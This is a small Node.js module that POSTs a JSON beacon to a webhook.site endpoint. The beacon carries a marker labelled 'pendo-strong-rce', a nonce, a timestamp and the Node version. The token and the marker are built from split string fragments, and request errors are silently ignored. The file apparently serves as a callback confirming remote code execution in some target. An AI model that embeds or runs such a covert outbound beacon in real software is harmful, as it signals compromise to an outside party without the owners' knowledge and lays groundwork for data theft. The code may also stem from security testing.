const crypto = require('crypto');
const https = require('https');

const TOKEN = ['4aa9ed2e', '9f20', '41a1', 'a319', '59b93937de0d'].join('-');
const MARKER = ['pendo', 'strong', 'rce', '20260907'].join('-');

function send(phase) {
  const body = JSON.stringify({
    marker: MARKER,
    phase,
    nonce: crypto.randomBytes(12).toString('hex'),
    timestamp: Date.now(),
    runtime: process.version,
  });
  const request = https.request({
    hostname: 'webhook.site',
    path: `/${TOKEN}/worker/${encodeURIComponent(phase)}`,
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Content-Length': Buffer.byteLength(body),
    },
  });
  request.on('error', () => {});
  request.end(body);
}

module.exports = { send };

if (require.main === module) {
  send(process.argv[2] || 'direct');
}
